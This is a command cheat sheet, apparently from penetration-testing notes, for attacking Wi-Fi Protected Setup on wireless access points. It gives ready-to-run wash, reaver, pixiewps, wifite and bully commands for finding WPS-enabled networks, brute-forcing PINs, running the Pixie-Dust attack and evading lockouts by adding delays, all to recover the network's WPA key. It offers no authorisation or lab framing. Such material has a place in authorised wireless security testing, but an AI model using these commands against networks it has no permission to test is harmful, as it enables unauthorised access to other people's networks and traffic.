# WPS Attacks

WPS (Wi-Fi Protected Setup) PIN attacks can recover the PSK in minutes without needing a handshake.

## WPS Scan
```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Scan specific channel
sudo wash -i wlan0mon -c 6

# Look for: "WPS" column shows "Yes" or "Locked"
```

## WPS PIN Brute Force (Reaver)
```bash
# Standard WPS PIN attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With channel specified
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Delay between attempts (avoid lockout)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -vv

# Timeout per PIN attempt
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10 -vv

# Reaver output: if successful, shows WPA PSK
```

## WPS Pixie-Dust Attack (Offline PIN Recovery)
Pixie-Dust exploits weak random number generation in some APs to recover the WPS PIN without brute force.

```bash
# Best tool: one-step Pixie-Dust in reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv

# Use pixiewps directly
sudo pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> \
  -a <AuthKey> -n <E-Nonce> -t <R-Nonce>

# Or use wifite (automated)
sudo wifite --wps
sudo wifite --wps-only   # Only attack WPS networks
```

## Bully (Alternative to Reaver)
```bash
sudo bully -b AA:BB:CC:DD:EE:FF wlan0mon

# With all options
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d 5 -t 10 -vv wlan0mon
```

## WPS Lockout Detection
```bash
# If AP locks WPS after failed attempts, wait 5-30 min
# wash output shows "Locked" in WPS column
# Use longer delays (-d 10 or higher)
```
